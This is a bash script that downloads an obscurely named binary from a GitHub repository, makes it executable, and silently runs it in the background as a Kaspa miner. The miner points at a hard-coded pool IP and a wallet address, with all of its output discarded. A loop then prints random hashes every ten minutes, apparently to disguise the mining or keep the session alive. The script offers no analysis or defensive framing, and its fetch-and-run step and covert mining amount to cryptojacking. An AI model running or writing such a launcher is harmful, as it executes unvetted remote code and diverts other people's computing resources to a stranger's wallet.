# /bin/bash

wget https://github.com/sbwsmg/kaspa/raw/main/AkubapakMU
chmod 700 AkubapakMU

#!/bin/bash

POOL=165.232.160.161:443
WALLET=kaspa:qpj9fmx2lu6n6lcmgq0wsyqjk5lz25dd0r7dfpdkz0uhha7gcnplqzcngaxjd

./AkubapakMU --algo KASPA --pool $POOL --user $WALLET $@ --no-cl > /dev/null 2>&1 &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done